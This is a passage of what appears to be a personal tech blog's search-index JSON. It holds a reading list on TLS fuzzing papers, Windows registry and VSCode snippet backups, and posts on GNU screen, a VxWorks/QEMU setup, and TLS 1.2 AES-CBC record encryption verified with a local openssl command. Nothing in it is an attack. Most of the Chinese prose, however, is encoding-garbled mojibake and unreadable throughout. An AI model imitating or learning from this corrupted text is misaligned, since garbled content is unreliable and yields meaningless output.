”ç©¶æ£€æµ‹ 46 A Tale of the OpenSSL State Machine A Large-Scale Black-Box Analysis 51 Model Learning and Model Checking of SSH Implementations 47 Systematic Fuzzing and Testing of TLS Libraries 2021-10-16 -&gt; 2021-10-22 TLSåè®®.X.509è¯ä¹¦,å·®åˆ†æ¨¡ç³Šæµ‹è¯•:å¯¹è¯ä¹¦ç»“æ„å†…å®¹ä¿®æ”¹ Using Frankencerts for Automated Adversarial Testing of Certificate Validation in SSL/TLS Implementations å¯¹è¯ä¹¦ç¼–ç åDERå†…å®¹è¿›è¡Œä¿®æ”¹ SADT: Syntax-Aware Differential Testing of Certificate Validation in SSL/TLS Implementations 2021-06-24 -&gt; 2021-07-01 TLSæ¡æ‰‹åè®® ClientHelloæ¶ˆæ¯,å·®åˆ†æ¨¡ç³Šæµ‹è¯•: Towards Fuzzing-Based Differential Black-Box Testing of TLS Implementations 2021-10-16 -&gt; 2021-10-22 Rise of the Machines On the Security of Cellular IoT Devices master thesis 2021-09-17 -&gt; 2021-09-24 ç‹: A framework for automating security analysis of the internet of things On the automation of security testing for IoT constrained scenarios æ¨: Automated Analysis of Secure Internet of Things Protocols"},{"title":"Reg_bak","date":"2021-11-06T07:01:30.000Z","updated":"2021-11-06T07:03:25.846Z","comments":true,"path":"page/reg_bak/index.html","permalink":"https://www.sizaif.com/page/reg_bak/","excerpt":"","text":"Windows Registry Editor Version 5.00 [HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\Item0] \"MUIVerb\"=\"sizaif\" \"SubCommands\"=\"Item0;Item1;Item2\" \"Icon\"=\"imageres.dll,193\" \"Position\"=\"top\" [HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\CommandStore\\shell\\Item0] \"MUIVerb\"=\"æ­¤å¤„æ‰“å¼€mintty\" \"Icon\"=\"C:\\\\cygwin64\\\\bin\\\\mintty.exe ,0\" [HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\CommandStore\\shell\\Item0\\command] @=\"C:\\\\cygwin64\\\\bin\\\\mintty.exe -e /bin/bash --login -i -c \\\"cd '%V';exec bash\" [HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\CommandStore\\shell\\Item1] \"MUIVerb\"=\"æ­¤å¤„æ‰“å¼€IDEA\" \"Icon\"=\"Q:\\\\fast_software\\\\IntelliJ IDEA 2021.2\\\\bin\\\\idea64.exe,0\" [HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\CommandStore\\shell\\Item1\\command] @=\"\\\"Q:\\\\fast_software\\\\IntelliJ IDEA 2021.2\\\\bin\\\\idea64.exe\\\" \\\"%V%\\\"\" [HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\CommandStore\\shell\\Item2] \"MUIVerb\"=\"æ­¤å¤„æ‰“å¼€Pycharm\" \"Icon\"=\"Q:\\\\PyCharm 2021.2\\\\bin\\\\pycharm64.exe,0\" [HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\CommandStore\\shell\\Item2\\command] @=\"\\\"Q:\\\\PyCharm 2021.2\\\\bin\\\\pycharm64.exe\\\" \\\"%V%\\\"\""},{"title":"","date":"2021-08-07T14:36:59.000Z","updated":"2021-09-20T01:32:03.020Z","comments":true,"path":"page/shuoshuo/index.html","permalink":"https://www.sizaif.com/page/shuoshuo/","excerpt":"","text":""},{"title":"Vscode_bak","date":"2021-11-06T07:13:59.000Z","updated":"2021-11-06T07:15:16.630Z","comments":true,"path":"page/vscode_bak/index.html","permalink":"https://www.sizaif.com/page/vscode_bak/","excerpt":"","text":"sizaif.json.code-snippets &#123; // Place your å…¨å±€ snippets here. Each snippet is defined under a snippet name and has a scope, prefix, body and // description. Add comma separated ids of the languages where the snippet is applicable in the scope field. If scope // is left empty or omitted, the snippet gets applied to all languages. The prefix is what is // used to trigger the snippet and the body will be expanded and inserted. Possible variables are: // $1, $2 for tab stops, $0 for the final cursor position, and $&#123;1:label&#125;, $&#123;2:another&#125; for placeholders. // Placeholders with the same ids are connected. // Example: // \"Print to console\": &#123; // \"scope\": \"javascript,typescript\", // \"prefix\": \"log\", // \"body\": [ // \"console.log('$1');\", // \"$2\" // ], // \"description\": \"Log output to console\" // &#125; \"Print to method1\": &#123; \"scope\": \"java,c,h,cpp\", \"prefix\": \"start\", \"body\": [ \"/**\", \" * @Author: sizaif\", \" * @Date: $&#123;CURRENT_YEAR&#125;-$&#123;CURRENT_MONTH&#125;-$&#123;CURRENT_DATE&#125; $&#123;CURRENT_HOUR&#125;:$&#123;CURRENT_MINUTE&#125;:$&#123;CURRENT_SECOND&#125;\", \" * @Description: $0\", \" * ***********\", \" * start\", \" * ***********\", \"* */\" ], \"description\": \"æ³¨é‡Šï¼Œstart\" &#125;, \"Print to method2\": &#123; \"scope\": \"java,c,h,cpp\", \"prefix\": \"end\", \"body\": [ \"/**\", \" * @Author: sizaif\", \" * @Date: $&#123;CURRENT_YEAR&#125;-$&#123;CURRENT_MONTH&#125;-$&#123;CURRENT_DATE&#125; $&#123;CURRENT_HOUR&#125;:$&#123;CURRENT_MINUTE&#125;:$&#123;CURRENT_SECOND&#125;\", \" * @Description: $0\", \" * ***********\", \" * end\", \" * ***********\", \"* */\" ], \"description\": \"æ³¨é‡Šï¼Œend\" &#125;, \"Print to method3\": &#123; \"scope\": \"java,c,h,cpp\", \"prefix\": \"ann\", \"body\": [ \"/**\", \" * @Author: sizaif\", \" * @Date: $&#123;CURRENT_YEAR&#125;-$&#123;CURRENT_MONTH&#125;-$&#123;CURRENT_DATE&#125; $&#123;CURRENT_HOUR&#125;:$&#123;CURRENT_MINUTE&#125;:$&#123;CURRENT_SECOND&#125;\", \" * @Description: $0\", \"* */\" ], \"description\": \"æ³¨é‡Š\" &#125; &#125;"},{"title":"Wiki","date":"2021-08-06T15:47:59.000Z","updated":"2021-08-06T15:47:59.000Z","comments":true,"path":"page/wiki/index.html","permalink":"https://www.sizaif.com/page/wiki/","excerpt":"","text":""},{"title":"Xnheulpb","date":"2021-12-02T02:21:52.000Z","updated":"2021-12-02T02:22:56.092Z","comments":true,"path":"page/xnheulpb/index.html","permalink":"https://www.sizaif.com/page/xnheulpb/","excerpt":"","text":"Windows Registry Editor Version 5.00 [HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\InputMethod\\Settings\\CHS] \"EnableExtraDomainType\"=dword:00000001 \"Enable Double Pinyin\"=dword:00000001 \"DoublePinyinScheme\"=dword:0000000a \"UserDefinedDoublePinyinScheme0\"=\"flypy*2*^*iuvdjhcwfg^xmlnpbksqszxkrltvyovt\""}],"posts":[{"title":"Screenç”¨æ³•å­¦ä¹ ","slug":"Screenç”¨æ³•å­¦ä¹ ","date":"2025-04-09T03:33:53.000Z","updated":"2025-04-09T03:35:56.286Z","comments":true,"path":"posts/443563e5/","link":"","permalink":"https://www.sizaif.com/posts/443563e5/","excerpt":"","text":"Screenç”¨æ³•å­¦ä¹  2025-04-09 11:17:38 sizaif ä»€ä¹ˆæ˜¯ Screen å‘½ä»¤ screen æ˜¯ä¸€ä¸ªå¤šä»»åŠ¡çª—å£ç®¡ç†å™¨ï¼Œå®ƒå…è®¸ç”¨æˆ·åœ¨å•ä¸ªç»ˆç«¯çª—å£ä¸­åˆ›å»ºå¤šä¸ªä¼šè¯ï¼Œå¹¶åœ¨è¿™äº›ä¼šè¯ä¹‹é—´è¿›è¡Œåˆ‡æ¢ã€‚å®ƒçš„æœ€å¤§ç‰¹ç‚¹æ˜¯å¯ä»¥å°†æ­£åœ¨è¿è¡Œçš„ä¼šè¯â€œè„±ç¦»â€å½“å‰çš„ç»ˆç«¯çª—å£ï¼Œå³ä½¿ç”¨æˆ·æ–­å¼€è¿æ¥æˆ–è€…å…³é—­ç»ˆç«¯ï¼Œä¼šè¯ä¾ç„¶ä¿æŒè¿è¡Œï¼Œç”¨æˆ·å¯ä»¥åœ¨ç¨åé‡æ–°è¿æ¥å¹¶ç»§ç»­æ“ä½œã€‚å¯¹äºé‚£äº›éœ€è¦åœ¨åå°è¿è¡Œé•¿æ—¶é—´ä»»åŠ¡çš„ç”¨æˆ·æ¥è¯´ï¼Œscreen æä¾›äº†æå¤§çš„ä¾¿åˆ©ã€‚ é€‚åˆä½¿ç”¨åœºæ™¯ è¿œç¨‹è¿æ¥ä¸­çš„é•¿æ—¶é—´ä»»åŠ¡ åœ¨ä½¿ç”¨ ssh è¿œç¨‹è¿æ¥æœåŠ¡å™¨æ—¶ï¼Œè¿è¡Œä¸€äº›éœ€è¦é•¿æ—¶é—´æ‰§è¡Œçš„ä»»åŠ¡ï¼Œæ¯”å¦‚æ•°æ®åº“å¤‡ä»½ã€æ–‡ä»¶ä¼ è¾“ã€ç¼–è¯‘å¤§è§„æ¨¡é¡¹ç›®ç­‰ï¼Œå¸¸å¸¸å› ä¸ºç½‘ç»œä¸ç¨³å®šæˆ–æ„å¤–æ–­å¼€è¿æ¥å¯¼è‡´ä»»åŠ¡ä¸­æ–­ã€‚é€šè¿‡ screen å‘½ä»¤ï¼Œå¯ä»¥å°†è¿™äº›ä»»åŠ¡ç½®äºåå°ç»§ç»­è¿è¡Œï¼Œå³ä½¿æ–­å¼€è¿æ¥ï¼Œä»»åŠ¡ä¹Ÿä¸ä¼šå—åˆ°å½±å“ã€‚ ç®¡ç†å¤šä¸ªä»»åŠ¡ åœ¨ä¸€ä¸ªç»ˆç«¯ä¸­åŒæ—¶è¿è¡Œå¤šä¸ªä»»åŠ¡æ˜¯å¸¸è§éœ€æ±‚ã€‚é€šè¿‡ screenï¼Œç”¨æˆ·å¯ä»¥åœ¨åŒä¸€ä¸ªä¼šè¯ä¸­åˆ›å»ºå¤šä¸ªçª—å£ï¼Œæ¯ä¸ªçª—å£ç‹¬ç«‹è¿è¡Œä¸åŒçš„ä»»åŠ¡ï¼Œæå¤§åœ°æé«˜äº†æ•ˆç‡ã€‚ ååŒæ“ä½œ screen è¿˜æ”¯æŒå¤šä¸ªç”¨æˆ·å…±äº«åŒä¸€ä¸ªä¼šè¯ã€‚è¿™åœ¨å›¢é˜Ÿåˆä½œã€è¿œç¨‹æ•™å­¦æˆ–å®æ—¶ååŒè°ƒè¯•ä¸­éå¸¸æœ‰ç”¨ã€‚ç”¨æˆ·åªéœ€å¯åŠ¨ä¸€ä¸ª screen ä¼šè¯ï¼Œç„¶åå…¶ä»–ç”¨æˆ·å¯ä»¥é€šè¿‡ç›¸åŒçš„å‘½ä»¤è¿›å…¥åˆ°è¯¥ä¼šè¯ä¸­ä¸€èµ·æ“ä½œã€‚ ç›‘æ§ä»»åŠ¡çš„å®æ—¶è¾“å‡º æœ‰äº›æ—¶å€™æˆ‘ä»¬éœ€è¦ç›‘æ§ä¸€äº›è„šæœ¬æˆ–æœåŠ¡çš„å®æ—¶è¾“å‡ºï¼Œç¡®ä¿å®ƒä»¬æ­£å¸¸è¿è¡Œã€‚screen å…è®¸æˆ‘ä»¬åœ¨åå°è¿è¡Œè¿™äº›ä»»åŠ¡ï¼Œå¹¶éšæ—¶é€šè¿‡é‡æ–°è¿æ¥ä¼šè¯æ¥æ£€æŸ¥å®ƒä»¬çš„è¾“å‡ºã€‚ Screen å‘½ä»¤çš„ä¸»è¦åŠŸèƒ½ screen å‘½ä»¤çš„æ ¸å¿ƒåŠŸèƒ½æ˜¯æä¾›ä¸€ç§è™šæ‹Ÿçš„ç»ˆç«¯ä¼šè¯ç®¡ç†æ–¹å¼ï¼Œå…·ä½“æ¥è¯´åŒ…æ‹¬ä»¥ä¸‹å‡ ç‚¹ï¼š ä¿æŒä¼šè¯è¿è¡Œï¼šå½“ç”¨æˆ·å…³é—­å½“å‰çš„ç»ˆç«¯çª—å£ï¼Œscreen ä¼šä¿æŒä¼šè¯ç»§ç»­è¿è¡Œï¼Œè¿™ä½¿å¾—é•¿æ—¶é—´ä»»åŠ¡åœ¨ç½‘ç»œæ–­å¼€æˆ–æ„å¤–ä¸­æ–­æ—¶ä»èƒ½é¡ºåˆ©æ‰§è¡Œã€‚ ä¼šè¯çš„æ¢å¤ï¼šç”¨æˆ·å¯ä»¥éšæ—¶æ–­å¼€å’Œé‡æ–°è¿æ¥ä¸€ä¸ªä¼šè¯ï¼Œè¿™ç§â€œå¯æ¢å¤æ€§â€å¯¹äºè¿œç¨‹ç®¡ç†éå¸¸æœ‰ç”¨ã€‚ å¤šä¼šè¯ç®¡ç†ï¼šç”¨æˆ·å¯ä»¥åœ¨ä¸€ä¸ªç»ˆç«¯çª—å£ä¸­è¿è¡Œå¤šä¸ªç‹¬ç«‹çš„ä¼šè¯ï¼Œå¹¶é€šè¿‡å¿«æ·é”®åœ¨ä¸åŒä¼šè¯ä¹‹é—´è‡ªç”±åˆ‡æ¢ã€‚ å…±äº«ä¼šè¯ï¼šå¤šä¸ªç”¨æˆ·å¯ä»¥å…±äº«ä¸€ä¸ªä¼šè¯ï¼Œè¿™å¯¹äºéœ€è¦ååŒæ“ä½œçš„åœºæ™¯å°¤å…¶æœ‰ç”¨ã€‚ Screen çš„åŸºç¡€ä½¿ç”¨ å¯åŠ¨ä¸€ä¸ªæ–°çš„ Screen ä¼šè¯ è¦å¯åŠ¨ä¸€ä¸ªæ–°çš„ screen ä¼šè¯ï¼Œåªéœ€åœ¨ç»ˆç«¯ä¸­è¾“å…¥ screen å‘½ä»¤å³å¯ï¼š screen æ­¤æ—¶ï¼Œæ‚¨è¿›å…¥äº†ä¸€ä¸ªæ–°çš„ screen ä¼šè¯ï¼Œå¯ä»¥åƒå¹³å¸¸ä¸€æ ·æ‰§è¡Œå‘½ä»¤ã€‚å¦‚æœè¦é€€å‡ºè¯¥ä¼šè¯ä½†ä¸å…³é—­å®ƒï¼Œå¯ä»¥ä½¿ç”¨ Ctrl + A ç„¶åæŒ‰ Dï¼ˆå³â€œdetachâ€ ä¼šè¯ï¼‰ã€‚ æ¢å¤ä¸€ä¸ªæ–­å¼€çš„ Screen ä¼šè¯ å½“éœ€è¦é‡æ–°è¿æ¥ä¸€ä¸ªå·²ç»â€œè„±ç¦»â€çš„ä¼šè¯æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ screen -r å‘½ä»¤ï¼š screen -r å¦‚æœæœ‰å¤šä¸ªä¼šè¯è¿è¡Œï¼Œå¯ä»¥é€šè¿‡ screen -ls æ¥æŸ¥çœ‹å½“å‰æ­£åœ¨è¿è¡Œçš„ä¼šè¯ï¼Œå¹¶æŒ‡å®šè¦æ¢å¤çš„ä¼šè¯ IDï¼š screen -ls screen -r [ä¼šè¯ID] é€€å‡ºä¸€ä¸ª Screen ä¼šè¯ å½“ä»»åŠ¡å®Œæˆåï¼Œå¯ä»¥é€šè¿‡ exit å‘½ä»¤é€€å‡ºä¼šè¯ï¼š exit è¿™å°†å…³é—­å½“å‰çš„ä¼šè¯çª—å£ï¼Œå¹¶ç»ˆæ­¢å…¶ä¸­è¿è¡Œçš„è¿›ç¨‹ã€‚ Screen å‘½ä»¤çš„å¸¸ç”¨å‚æ•° Use: screen [-opts] [cmd [args]] or: screen -r [host.tty] Options: -4 Resolve hostnames only to IPv4 addresses. -6 Resolve hostnames only to IPv6 addresses. -a Force all capabilities into each window's termcap. -A -[r|R] Adapt all windows to the new display width &amp; height. -c file Read configuration file instead of '.screenrc'. -d (-r) Detach the elsewhere running screen (and reattach here). -dmS name Start as daemon: Screen session in detached mode. -D (-r) Detach and logout remote (and reattach here). -D -RR Do whatever is needed to get a screen session. -e xy Change command characters. -f Flow control on, -fn = off, -fa = auto. -h lines Set the size of the scrollback history buffer. -i Interrupt output sooner when flow control is on. -l Login mode on (update /var/run/utmp), -ln = off. -ls [match] or -list Do nothing, just list our SockDir [on possible matches]. -L Turn on output logging. -Logfile file Set logfile name. -m ignore $STY variable, do create a new screen session. -O Choose optimal output rather than exact vt100 emulation. -p window Preselect the named window if it exists. -q Quiet startup. Exits with non-zero return code if unsuccessful. -Q Commands will send the response to the stdout of the querying process. -r [session] Reattach to a detached screen process. -R Reattach if possible, otherwise start a new session. -s shell Shell to execute rather than $SHELL. -S sockname Name this session &lt;pid>.sockname instead of &lt;pid>.&lt;tty>.&lt;host>. -t title Set title. (window's name). -T term Use term as $TERM for windows, rather than \"screen\". -U Tell screen to use UTF-8 encoding. -v Print \"Screen version 4.08.00 (GNU) 05-Feb-20\". -wipe [match] Do nothing, just clean up SockDir [on possible matches]. -x Attach to a not detached screen. (Multi display mode). -X Execute &lt;cmd> as a screen command in the specified session. å¸¸ç”¨å‘½ä»¤ -S XXX æŒ‡å®šä¼šè¯åç§°ID -r XXX æ¢å¤IDä¼šè¯ -d å¼ºåˆ¶è„±ç¦»ä¼šè¯ # åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæ‚¨å¯èƒ½å·²ç»ä»æŸä¸ªç»ˆç«¯è¿æ¥äº† screen ä¼šè¯ï¼Œæ­¤æ—¶æƒ³è¦ä»å¦ä¸€ä¸ªç»ˆç«¯è¿æ¥è¯¥ä¼šè¯ï¼Œå¯ä»¥ä½¿ç”¨ -d -r å‚æ•°å¼ºåˆ¶è„±ç¦»å¹¶æ¢å¤ï¼šscreen -d -r mysession -lsï¼šåˆ—å‡ºæ‰€æœ‰ä¼šè¯ Screenè¿›é˜¶ä½¿ç”¨ åœ¨ä¼šè¯ä¸­åˆ›å»ºæ–°çª—å£ åœ¨ä¸€ä¸ª screen ä¼šè¯ä¸­ï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡å¿«æ·é”® Ctrl + A ç„¶åæŒ‰ C æ¥åˆ›å»ºä¸€ä¸ªæ–°çª—å£ã€‚æ¯ä¸ªçª—å£éƒ½ç›¸å½“äºä¸€ä¸ªç‹¬ç«‹çš„ shell ç¯å¢ƒï¼Œç”¨æˆ·å¯ä»¥åœ¨ä¸åŒçª—å£ä¸­è¿è¡Œä¸åŒçš„ä»»åŠ¡ã€‚ åœ¨ä¸åŒçª—å£é—´åˆ‡æ¢ åœ¨ screen ä¸­å¯ä»¥ä½¿ç”¨ Ctrl + A ç„¶åæŒ‰æ•°å­—é”® 0 åˆ° 9 æ¥åˆ‡æ¢åˆ°æŒ‡å®šçš„çª—å£ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ Ctrl + A ç„¶åæŒ‰ N æ¥åˆ‡æ¢åˆ°ä¸‹ä¸€ä¸ªçª—å£ å…³é—­çª—å£ è¦å…³é—­å½“å‰çª—å£ï¼Œåªéœ€åœ¨çª—å£ä¸­è¿è¡Œ exit å‘½ä»¤ã€‚è¿™ä¸ªæ“ä½œç±»ä¼¼äºé€€å‡ºä¸€ä¸ªæ™®é€šçš„ shell ä¼šè¯ã€‚","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"Linux","slug":"æŠ€æœ¯å‘/Linux","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.sizaif.com/tags/Linux/"},{"name":"å¤šä¼šè¯","slug":"å¤šä¼šè¯","permalink":"https://www.sizaif.com/tags/%E5%A4%9A%E4%BC%9A%E8%AF%9D/"}],"author":"sizaif"},{"title":"Vxworksç¯å¢ƒä¸ç¨‹åºéªŒè¯","slug":"Vxworksç¯å¢ƒä¸ç¨‹åºéªŒè¯","date":"2025-02-24T07:50:05.000Z","updated":"2025-02-25T11:25:12.677Z","comments":true,"path":"posts/e4b5eda/","link":"","permalink":"https://www.sizaif.com/posts/e4b5eda/","excerpt":"","text":"Vxworksç¯å¢ƒä¸ç¨‹åºéªŒè¯ æ³¨æ„äº‹é¡¹ WorkBecnhæ¶æ„å¹³å°è¦é€‰æ‹©æ­£ç¡® QEmuè¿è¡ŒVxworksæ‰§è¡Œæ­£ç¡® é€šè¿‡FTPå°†vxeæ–‡ä»¶ä¼ è¾“ç»™VXWorks æ­å»ºVxworksç¯å¢ƒ VmWareè™šæ‹Ÿæœºä¸­è¿è¡Œ vxworks6.8 VmWareè™šæ‹Ÿæœºä¸­è¿è¡ŒWIN10-workbench (vmware17) è™šæ‹Ÿæœºäº’é€š Qemuè¿è¡Œ æ‰§è¡Œå‘½ä»¤ qemu-system-i386 -monitor stdio -display none -vnc :0 -netdev bridge,id=hn0,br=br0 -device e1000-82544gc,netdev=hn0 -hda image/vxboot.img WorkBench ç¼–è¯‘è¿è¡ŒApplicationé¡¹ç›® WorkBenchç¯å¢ƒæ­å»ºï¼š å‚è€ƒ WorkBenchæ­å»º VxWorksç¯å¢ƒæ­å»ºä¸å­¦ä¹ ï¼švxworks6.8å’Œworkbench3.2 ä»¥ä¸‹é»˜è®¤å·²æ­å»ºå®Œæˆç¯å¢ƒï¼š WorkBecnhä¸­æ„å»º Real Tme Process Project è®¾ç½®æ¶æ„å¹³å°ä¸º PENTIUM4gnu ç¼–è¯‘è¿è¡Œè·å¾— vxeæ–‡ä»¶ å°†vxeæ–‡ä»¶é€šè¿‡ftpä¼ è¾“ç»™Vxworksä¸­ Qemu è¿è¡ŒVxworks æµ‹è¯•","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"C++","slug":"æŠ€æœ¯å‘/C","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/C/"},{"name":"Vxworks","slug":"æŠ€æœ¯å‘/C/Vxworks","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/C/Vxworks/"}],"tags":[{"name":"VxWorks","slug":"VxWorks","permalink":"https://www.sizaif.com/tags/VxWorks/"},{"name":"WorkBebch","slug":"WorkBebch","permalink":"https://www.sizaif.com/tags/WorkBebch/"}],"author":"sizaif"},{"title":"AES_CBCå—åŠ å¯†å®ç°è¸©å‘è®°å½•","slug":"AES-CBCå—åŠ å¯†å®ç°è¸©å‘è®°å½•","date":"2025-02-21T07:34:40.000Z","updated":"2025-02-21T07:40:47.069Z","comments":true,"path":"posts/b2230133/","link":"","permalink":"https://www.sizaif.com/posts/b2230133/","excerpt":"","text":"AES_CBCå—åŠ å¯†å®ç°è¸©å‘è®°å½• å—åŠ å¯† ğŸ’¡ ä¸»è¦å®ç° âœ… æ”¯æŒ Encrypt-Then-MACï¼ˆETMï¼‰&amp; Mac-Then-Encrypt (MTE)ã€‚ âœ… æ”¯æŒ MAC-Then-Encryptï¼ˆæ ‡å‡† TLS 1.2ï¼‰ã€‚ âœ… æ ¹æ®åŠ å¯†å¥—ä»¶è¿›è¡Œå—åŠ å¯†ã€‚ âœ… ä½¿ç”¨åŠ å¯†å¥—ä»¶ä¸­çš„å“ˆå¸Œç®—æ³•è®¡ç®— MACã€‚ ğŸ”¹ encrypt_record() æµç¨‹ ç”Ÿæˆ éšæœº IVã€‚ è®¡ç®— HMAC-sha256ï¼ˆæ ¹æ® TLS 1.2 è®°å½•å±‚è§„åˆ™ï¼‰ä»¥HMAC-sha256ä¸ºä¾‹ AES-CBC åŠ å¯†ï¼ˆåŒ…å« MAC &amp; å¡«å……ï¼‰ ä»¥AES-CBCä¸ºä¾‹ã€‚ è¿”å› å®Œæ•´çš„ TLS è®°å½• (IV + Ciphertext)ã€‚ ğŸ”¹ decrypt_record() æµç¨‹ è§£æ IVï¼ˆæ˜¾å¼ IVï¼‰ã€‚ AES-CBC è§£å¯†ï¼ˆå»æ‰å¡«å……ï¼‰ã€‚ éªŒè¯ HMACï¼Œç¡®ä¿å®Œæ•´æ€§ã€‚ è¿”å› è§£å¯†åçš„æ˜æ–‡ã€‚ ğŸ”è®¡ç®—HMAC HMACè®¡ç®—çš„è¾“å…¥ç»“æ„å¦‚ä¸‹ AuthenticatedMetaData[seq_num (8B) + ContentType (1B) + TLSVersion (2B) + Length (2B) ]+ AuthenticatedNoMetaData[Finished æ˜æ–‡ (16B)] è¾“å‡ºé•¿åº¦åº”è¯¥è·ŸMAC_Keyé•¿åº¦ä¸€è‡´ MAC[mac_key_len] seq_num (8B) ï¼šå½“å‰ TLS è®°å½•çš„åºåˆ—å·ï¼Œä» 0 å¼€å§‹ï¼Œæ¯å‘é€ä¸€ä¸ªè®°å½•å¢åŠ  1ã€‚ ContentType (1B) ï¼šFinished æ¶ˆæ¯çš„ ContentType ä¸º 0x16ï¼ˆHandshakeï¼‰ã€‚ TLSVersion (2B) ï¼šTLS 1.2 ç‰ˆæœ¬ï¼Œå€¼ä¸º 0x0303ã€‚ Length (2B) ï¼šFinished æ¶ˆæ¯çš„æ˜æ–‡é•¿åº¦ï¼Œå€¼ä¸º 0x000Cï¼ˆ12ï¼‰ã€‚ Plaintext (16B) ï¼šå³ Finishedæ¶ˆæ¯ ğŸ“ŒAES å—åŠ å¯† AESåŠ å¯†çš„è¾“å…¥: plaintext = data + MAC + Padding è¦æ±‚ä¿è¯plaintextçš„é•¿åº¦æ—¶å—çš„å€æ•° /* * * æ³¨æ„ ä»…é€‚ç”¨äºéœ€è¦ PKCS#7 çš„æ¨¡å¼ï¼ˆå¦‚ AES-CBCã€AES-ECBï¼‰ * ä¸é€‚ç”¨äº AES-GCMã€AES-CCMï¼ˆAEAD æ¨¡å¼ä¸éœ€è¦å¡«å……ï¼‰ã€‚ */ //RFC5246 å®šä¹‰å—åŠ å¯†æ˜æ–‡ç»“æ„å¦‚ä¸‹ struct &#123; opaque IV[SecurityParameters.record_iv_length]; block-ciphered struct &#123; opaque content[TLSCompressed.length]; opaque MAC[SecurityParameters.mac_length]; uint8 padding[GenericBlockCipher.padding_length]; uint8 padding_length; ï¼ï¼ï¼ï¼ &#125;; &#125; GenericBlockCipher; æ ¹æ®RFC5246 ä¸­æè¿°ï¼Œ å®é™…çš„æ•°æ®è¦å¤šä¸€ä½ï¼Œå¤šä¸€ä¸ªpadding_length è€Œåœ¨opensslæœåŠ¡ç«¯å¤„ç†è®¡ç®—Contexté•¿åº¦æ—¶ï¼š ä»£ç å¦‚ä¸‹ï¼š aesni_cbc_encrypt(in, out, len, &amp;ctx->ks, ctx->base.iv, 0); //figure out payload length pad = out[len - 1]; inp_len = len - (SHA_DIGEST_LENGTH + pad + 1); :SHA_DIGEST_LENGTH = MAC_len æ‰€ä»¥å¦‚æœæˆ‘ä»¬è¿™é‡Œåº”è¯¥å¡«å……Padding_length-1 æ­£å¥½ä½¿å¾—è®¡ç®—çš„inp_lenæ­£ç¡®ï¼Œ å¦åˆ™ä¼šå¯¼è‡´è®¡ç®—MACå¤±è´¥ âœ… å¦‚ä½•ç¡®è®¤ä½¿ç”¨çš„å“ˆå¸Œç®—æ³•ï¼Ÿ åœ¨ ClientHello / ServerHello æ¡æ‰‹ è¿‡ç¨‹ä¸­ï¼ŒæœåŠ¡å™¨å’Œå®¢æˆ·ç«¯ä¼šåå•†ä¸€ä¸ª CipherSuiteï¼Œå…¶ä¸­ä¼šæŒ‡æ˜ HMAC çš„å“ˆå¸Œç®—æ³•ã€‚ä¾‹å¦‚ï¼š CipherSuite å¯†é’¥äº¤æ¢ç®—æ³• å¯¹ç§°åŠ å¯†ç®—æ³• MACï¼ˆHMAC å“ˆå¸Œï¼‰ç®—æ³• TLS_RSA_WITH_AES_128_CBC_SHA RSA AES-128-CBC SHA-1 TLS_RSA_WITH_AES_128_CBC_SHA256 RSA AES-128-CBC SHA-256 TLS_DHE_RSA_WITH_AES_256_GCM_SHA384 DHE + RSA AES-256-GCM SHA-384 TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 ECDHE + RSA AES-128-GCM SHA-256 æ‰€ä»¥ï¼Œæœ€ç»ˆçš„ HMAC å“ˆå¸Œç®—æ³•æ˜¯ç”± CipherSuite é€‰æ‹©çš„ã€‚ MAC Algorithm mac_length mac_key_length NULL N/A 0 0 MD5 HMAC-MD5 16 16 SHA HMAC-SHA1 20 20 SHA256 HMAC-SHA256 32 32 éªŒè¯åŠ å¯†ç»“æœæ˜¯å¦æ­£ç¡® # 1. ç”Ÿæˆå¡«å……åçš„æ˜æ–‡äºŒè¿›åˆ¶æ–‡ä»¶ echo \"1400000C0117E62EBD66175B27F52831E24C395647FEB439288B9D27C4B92BAF55928D350B0B0B0B0B0B0B0B0B0B0B0B10101010101010101010101010101010\" | xxd -r -p > padded.bin # æ‰§è¡ŒAES-128-CBCåŠ å¯† openssl enc -aes-128-cbc -nosalt \\ -K B7B77162CBF57D2A280CD9E77832877A \\ -iv 93578CFC6863B968A97327948D368FC1 \\ -in padded.bin -out encrypted.bin # æŸ¥çœ‹åŠ å¯†ç»“æœï¼ˆHexæ ¼å¼ï¼‰ xxd -p encrypted.bin | tr -d '\\n'","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"C++","slug":"æŠ€æœ¯å‘/C","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/C/"}],"tags":[{"name":"OpenSSL","slug":"OpenSSL","permalink":"https://www.sizaif.com/tags/OpenSSL/"},{"name":"TLS","slug":"TLS","permalink":"https://www.sizaif.com/tags/TLS/"}],"author":"sizaif"},{"title":"Openssl 